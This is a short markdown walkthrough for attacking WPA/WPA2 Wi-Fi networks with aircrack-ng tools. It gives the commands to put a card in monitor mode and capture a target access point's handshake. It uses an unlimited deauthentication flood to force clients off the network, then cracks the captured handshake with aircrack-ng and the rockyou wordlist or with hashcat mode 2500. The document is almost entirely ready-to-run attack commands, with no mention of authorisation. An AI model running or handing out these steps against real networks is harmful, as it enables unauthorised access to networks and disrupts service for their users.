# Attacking WAP and WAP2 Wireless Networks Using Airmon-nga and Airdump-ng

# and Cracking using Aircrack-ng or Hashcat


## Capturing the 4-way Handshake

Checking WiFi Cards

`iwconfig`

Setting WiFi Card on Monitor Mode

`sudo airmon-ng start wlan0`

Listening for networks

`sudo airodump-ng wlan0`

*Note: the interface name may or may not change from wlan0 to wlan0mon. Check with iwconfig*

Save the MAC address and the channel number of the Access Point you want to attack

Capture wireless network traffic on target AP. Keep this running in a single terminal.

`sudo airodump-ng -w <hack1> -c 11 --bssid <00:FF:FF:FF:FF:FF> <wlan0>`

- "--bssid 00:FF:FF:FF:FF:FF" specifies the MAC address of the access point (AP) 
- "wlan0" or "wlan0mon" is the name of the wireless network interface to use for capturing traffic.
- "-c 11" specifies the wireless channel to capture traffic on.
- "-w hack1" specifies the name of the output file. In this case, it's "hack1".


In another terminal, de-Authenticate to to force reconnection and capture the handshake.

`sudo aireplay-ng --deauth 0 -a <00:FF:FF:FF:FF:FF> <wlan0>`

Stop monitor mode

`airmon-ng stop wlan0mon`


## Cracking the Captured Handshake

### Method 1 - Aircrack-ng

`aircrack-ng <hack1.cap> -w /usr/share/wordlists/rockyou.txt `


### Method 2 - Hashcat

Installation

`apt-get install hashcat`
`sudo apt-get install hcxtools`

Convert the .cap file to .hccapx format using the "cap2hccapx" tool. The syntax of the command

`cap2hccapx <input.cap> <output.hccapx>`

Crack

`hashcat -m 2500 -a 0 -w 3 <output.hccapx> <wordlist.txt>`

